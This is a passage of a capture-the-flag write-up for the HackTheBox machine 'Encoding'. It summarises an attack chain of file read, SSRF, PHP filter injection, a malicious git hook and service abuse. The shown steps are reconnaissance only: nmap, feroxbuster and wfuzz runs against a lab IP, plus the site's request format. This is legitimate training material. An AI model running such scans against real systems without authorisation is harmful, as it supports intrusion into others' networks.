@@ -1,0 +1,1191 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Encoding</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-encoding">htb-encoding</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#file-read">file-read</a> <a class="post-tag" href="/tags#lfi">lfi</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#subdomain">subdomain</a> <a class="post-tag" href="/tags#ssrf">ssrf</a> <a class="post-tag" href="/tags#filter">filter</a> <a class="post-tag" href="/tags#php-filter-injection">php-filter-injection</a> <a class="post-tag" href="/tags#youtube">youtube</a> <a class="post-tag" href="/tags#source-code">source-code</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#git-manual">git-manual</a> <a class="post-tag" href="/tags#git-dumper">git-dumper</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#flask">flask</a> <a class="post-tag" href="/tags#proxy">proxy</a> <a class="post-tag" href="/tags#uri-structure">uri-structure</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#git-hooks">git-hooks</a> <a class="post-tag" href="/tags#systemd">systemd</a> <a class="post-tag" href="/tags#service">service</a> <a class="post-tag" href="/tags#chatgpt">chatgpt</a> <a class="post-tag" href="/tags#parse-url">parse_url</a> <a class="post-tag" href="/tags#htb-updown">htb-updown</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-04-15T13:45:00+00:00" itemprop="datePublished">Apr 15, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/04/15/htb-encoding.html" style="color: #e6e6e6; text-decoration: none;">HTB: Encoding</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/encoding-cover.webp" type="image/webp"/>
+<img alt="Encoding" class="include_image" loading="lazy" src="/img/encoding-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Encoding centered around a web application where I’ll first identify a file read vulnerability, and leverage that to exfil a git repo from a site that I can’t directly access. With that repo, I’ll identify a new web URL that has a local file include vulnerability, and leverage a server-side request forgery to hit that and get execution using php filter injection. To get to the next user I’ll install a malicious git hook. That user is able to create and start services, which I’ll abuse to get root. In Beyond root, I’ll look at an SSRF that worked for IppSec but not me, and show how we troubleshot it to find some unexpected behavior from the PHP <code class="language-plaintext highlighter-rouge">parse_url</code> function.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/526 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/encoding" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Encoding</a> <a href="https://hackthebox.com/machines/encoding" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-encoding.webp" type="image/webp"/> <img alt="Encoding" class="img-av" src="/icons/box-encoding.png"/></picture></a><br/><a href="https://hackthebox.com/machines/encoding" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1618640023208828933">28 Jan 2023</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">15 Apr 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/encoding-diff.webp" type="image/webp"/><img alt="Rated difficulty for Encoding" src="/img/encoding-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/encoding-radar.webp" type="image/webp"/><img alt="Radar chart for Encoding" src="/img/encoding-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:56:52</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:59:15</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/389926" rel="noopener" target="_blank"><img alt="kavigihan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/389926" style="display: unset"/><span class="user-text" style="display: none"> kavigihan</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.198
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-09 21:05 EDT
+Nmap scan report for 10.10.11.198
+Host is up (0.087s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.10.11.198
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-09 21:06 EDT
+Nmap scan report for 10.10.11.198
+Host is up (0.087s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: HaxTables
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 22.04 jammy.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is called HaxTables:</p>
+<picture>
+<source srcset="/img/image-20230409210838407.webp" type="image/webp"/>
+<img alt="image-20230409210838407" class="include_image" loading="lazy" src="/img/image-20230409210838407.png"/>
+</picture>
+<p>It describes itself as:</p>
+<blockquote>
+<p>Free online String and Number converter. Just load  your input  and they will automatically get converted to selected  format.  A collection of useful utilities for working with String and  Integer values. All are simple, free and easy to use. There are no ads,  popups or other garbage!</p>
+</blockquote>
+<p>The “About us” link doesn’t go anywhere. The “Convertions” is a drop-down menu:</p>
+<picture>
+<source srcset="/img/image-20230409210943019.webp" type="image/webp"/>
+<img alt="image-20230409210943019" class="include_image" loading="lazy" src="/img/image-20230409210943019.png"/>
+</picture>
+<p>The “Images” link just leads to a page that says “Coming soon!”. The “String” and “Integer” links lead to very similar pages that take some input text and allow the user to select a conversion:</p>
+<picture>
+<source srcset="/img/image-20230409211135006.webp" type="image/webp"/>
+<img alt="image-20230409211135006" class="include_image" loading="lazy" src="/img/image-20230409211135006.png"/>
+</picture>
+<p>It does what would be expected:</p>
+<picture>
+<source srcset="/img/image-20230409211229540.webp" type="image/webp"/>
+<img alt="image-20230409211229540" class="include_image" loading="lazy" src="/img/image-20230409211229540.png"/>
+</picture>
+<p>The “API” link have a page with a bunch of examples for interacting with the API at <code class="language-plaintext highlighter-rouge">api.haxtables.htb</code>:</p>
+<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="/img/image-20230409211601168.png">
+<img alt="image-20230409211601168" src="/img/image-20230409211601168.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 475px"><a href="/img/image-20230409211601168.png"><i>Click for full image</i></a></div>
+</div>
+<p>The examples are all Python examples using the <a href="https://requests.readthedocs.io/en/latest/">Requests</a> module to interact with the endpoints.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The URLs show that this page is written in PHP. In fact, it’s using a common PHP pattern, where each page is of the form <code class="language-plaintext highlighter-rouge">http://10.10.11.198/index.php?page=api</code>. If <code class="language-plaintext highlighter-rouge">page=string</code>, it loads the string conversions page. Similarly with <code class="language-plaintext highlighter-rouge">page=integer</code> and <code class="language-plaintext highlighter-rouge">page=image</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">index.php</code> is almost certainly taking the <code class="language-plaintext highlighter-rouge">page</code> parameter manipulating it by filtering, prepending a path, and appending <code class="language-plaintext highlighter-rouge">.php</code>.</p>
+<p>Sometimes it’s possible to access these files directly by visiting something like <code class="language-plaintext highlighter-rouge">http://10.10.11.198/image.php</code>, but it returns 404 not found. <code class="language-plaintext highlighter-rouge">/includes.image.php</code> also is 404. It turns out the page is <code class="language-plaintext highlighter-rouge">/includes/image.html</code> and that is accessible, but it’s not important to know that.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.198 <span class="nt">-x</span> php 
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.9.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.198
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.9.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      274c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      277c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        1l        3w       16c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      315c http://10.10.11.198/includes =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.198/includes/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       48l      137w     1999c http://10.10.11.198/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       31l       80w     1019c http://10.10.11.198/assets/js/main.js
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      313c http://10.10.11.198/assets =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.198/assets/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      167l      329w     3025c http://10.10.11.198/assets/css/main.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     2206l    13654w  1120123c http://10.10.11.198/assets/img/index.png
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       48l      137w     1999c http://10.10.11.198/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        5l       53w      375c http://10.10.11.198/includes/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       38c http://10.10.11.198/handler.php
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     86041/86041   0s      </span><span class="feroxbuster-green">found</span><span class="go">:9       </span><span class="feroxbuster-red">errors</span><span class="go">:428    
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     43008/43008   279/s   http://10.10.11.198/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     43008/43008   279/s   http://10.10.11.198/includes/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://10.10.11.198/assets/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1s     43008/43008   0/s     http://10.10.11.198/assets/img/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://10.10.11.198/assets/js/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     43008/43008   0/s     http://10.10.11.198/assets/css/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go">
+</span></code></pre></div></div>
+<p>Nothing new or interesting here.</p>
+<p>Before version 2.9.3 of <code class="language-plaintext highlighter-rouge">feroxbuster</code>, I’ll need to explicitly filter 404 and 403 to get rid of a ton of noise (<code class="language-plaintext highlighter-rouge">-C 403,404</code>). It turns out that non-existent pages ending in <code class="language-plaintext highlighter-rouge">.php</code> return different 404 pages (9 lines) than non-existent pages without an extension (1 line), so the auto filtering doesn’t filter the <code class="language-plaintext highlighter-rouge">.php</code> 404s. Within a day of tipping off epi, <a href="https://github.com/epi052/feroxbuster/releases/tag/v2.9.3">the v2.9.3 release</a> fixed the autofilter!</p>
+<h4 id="api-calls">API Calls</h4>
+<p>When I click submit on one of the forms, there’s JavaScript in the page that sends a request to <code class="language-plaintext highlighter-rouge">/handler.php</code>. The JavaScript invoked is the <code class="language-plaintext highlighter-rouge">make_req</code> function:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">make_req</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">ele</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">selectopt</span><span class="dl">'</span><span class="p">);</span>
+              
+    <span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">ele</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">ele</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">checked</span><span class="p">)</span>
+        <span class="kd">var</span> <span class="nx">action</span> <span class="o">=</span> <span class="nx">ele</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">uri_path</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">uri_path</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+
+    <span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span> 
+    <span class="kd">var</span> <span class="nx">theUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/handler.php</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nx">xmlhttp</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">theUrl</span><span class="p">);</span>
+    <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">json</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">xmlhttp</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json;charset=UTF-8</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">xmlhttp</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span> 
+        <span class="dl">"</span><span class="s2">action</span><span class="dl">"</span><span class="p">:</span> <span class="nx">action</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span> <span class="nx">data</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">uri_path</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">uri_path</span> 
+    <span class="p">}));</span>
+
+    <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">responseObj</span> <span class="o">=</span> <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">response</span><span class="p">;</span>
+        <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">responseObj</span><span class="p">.</span><span class="nx">data</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">data_out</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">responseObj</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">data_out</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">responseObj</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">};</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This generates a POST request to <code class="language-plaintext highlighter-rouge">/handler.php</code> that looks like:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/handler.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.198</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">69</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.198</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.198/index.php?page=string</span>
+
+<span class="p">{</span><span class="nl">"action"</span><span class="p">:</span><span class="s2">"md5"</span><span class="p">,</span><span class="nl">"data"</span><span class="p">:</span><span class="s2">"0xdf was here"</span><span class="p">,</span><span class="nl">"uri_path"</span><span class="p">:</span><span class="s2">"/v3/tools/string"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll note that a path is being sent in the request as something I might mess with.</p>
+<h3 id="subdomain-brute-force">Subdomain Brute Force</h3>
+<p>Given the use of <code class="language-plaintext highlighter-rouge">api.haxtables.htb</code>, I’ll brute force for any additional subdomains that may be in use. Originally I’ll start it without a filter, and notice that the default case is 1999 characters:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> http://10.10.11.198 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.haxtables.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+<span class="go">********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.198/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   200        48 L     137 W      1999 Ch     "www"
+000000042:   200        48 L     137 W      1999 Ch     "static"
+000000041:   200        48 L     137 W      1999 Ch     "dns1"
+000000015:   200        48 L     137 W      1999 Ch     "ns"
+000000003:   200        48 L     137 W      1999 Ch     "ftp"
+000000043:   200        48 L     137 W      1999 Ch     "lists"
+000000031:   200        48 L     137 W      1999 Ch     "mobile"
+000000040:   200        48 L     137 W      1999 Ch     "ns4"
+000000007:   200        48 L     137 W      1999 Ch     "webdisk"
+^C
+</span></code></pre></div></div>
+<p>The default case seems to be 1999 characters, so running with <code class="language-plaintext highlighter-rouge">--hh 1999</code> will hide those responses and show anything different:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> http://10.10.11.198 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.haxtables.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">--hh</span> 1999
+<span class="go">********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.198/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000051:   200        0 L      0 W        0 Ch        "api"
+000000177:   403        9 L      28 W       284 Ch      "image"
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4987
+Requests/sec.: 0
+</span></code></pre></div></div>
+<p>It finds one more, <code class="language-plaintext highlighter-rouge">image.haxtables.htb</code>. I’lll add all of these to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.198 haxtables.htb api.haxtables.htb image.haxtables.htb
+</code></pre></div></div>
+<h3 id="imagehaxtableshtb---tcp-80">image.haxtables.htb - TCP 80</h3>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://image.haxtables.htb</code> returns an Apache 403 Forbidden page.</p>
+<p><code class="language-plaintext highlighter-rouge">feroxbuster</code> doesn’t find anything.</p>
+<p>This seems like a dead end for now. It could be filtering based on my IP, or I might need to know a path on the virtual host. Either way, once I get a shell or a way to make requests from the host I’ll come back.</p>
+<h3 id="apihaxtableshtb---tcp-80">api.haxtables.htb - TCP 80</h3>
+<h4 id="documentation">Documentation</h4>
+<p>The root <code class="language-plaintext highlighter-rouge">api.haxtables.htb</code> returns an empty response. However, the API page on the main site has documentation about the API. This is not a very realistic looking API, but perhaps it fits the toy website on this box.</p>
+<p>The documentation gives the following endpoints:</p>
+<ul>
+<li>POST to <code class="language-plaintext highlighter-rouge">/v3/tools/string/index.php</code> - takes an <code class="language-plaintext highlighter-rouge">action</code> and <code class="language-plaintext highlighter-rouge">data</code>, where <code class="language-plaintext highlighter-rouge">action</code> defines the string conversion requested to be performed on <code class="language-plaintext highlighter-rouge">data</code>.</li>
+<li>POST to <code class="language-plaintext highlighter-rouge">/v3/tools/integer/index.php</code> - same as <code class="language-plaintext highlighter-rouge">string</code>, taking an <code class="language-plaintext highlighter-rouge">action</code> and <code class="language-plaintext highlighter-rouge">data</code>.</li>
+</ul>
+<p>Both endpoints can also handle requests sent as form data and with a <code class="language-plaintext highlighter-rouge">file_url</code> instead of the data to be encoded.</p>
+<h4 id="form-data">Form Data</h4>
+<p>I went down a bit of a rabbit hole looking at the form data - This section isn’t important for solving the box.</p>
+<p>The example uses both <code class="language-plaintext highlighter-rouge">data</code> :</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">action</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">str2hex</span><span class="sh">'</span><span class="p">}</span>
+<span class="n">f</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">data_file</span><span class="sh">'</span> <span class="p">:</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/data.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)}</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://api.haxtables.htb/v3/tools/string/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">f</span><span class="p">)</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">files</code> in a <code class="language-plaintext highlighter-rouge">requests</code> request tells it to send it as multipart form data. The HTTP request will define a <code class="language-plaintext highlighter-rouge">boundary</code> in the <code class="language-plaintext highlighter-rouge">Content-Type</code> header, and then have sections divided by that <code class="language-plaintext highlighter-rouge">boundary</code> string, each with some metadata and then the data.</p>
+<p>In this example, for some reason they put part of it in as <code class="language-plaintext highlighter-rouge">data</code> and part as <code class="language-plaintext highlighter-rouge">files</code>. <code class="language-plaintext highlighter-rouge">requests</code> will combine <code class="language-plaintext highlighter-rouge">data</code> and <code class="language-plaintext highlighter-rouge">files</code> and handle them all like files (though the <code class="language-plaintext highlighter-rouge">action</code> doesn’t get a <code class="language-plaintext highlighter-rouge">filename</code> metadata entry):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/v3/tools/string/index.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">api.haxtables.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.28.2</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">249</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=1c2d49b3b9286f33ea5a1aeb8e8e3843</span>
+
+--1c2d49b3b9286f33ea5a1aeb8e8e3843
+Content-Disposition: form-data; name="action"
+
+str2hex
+--1c2d49b3b9286f33ea5a1aeb8e8e3843
+Content-Disposition: form-data; name="data_file"; filename="temp"
+
+temp data
+
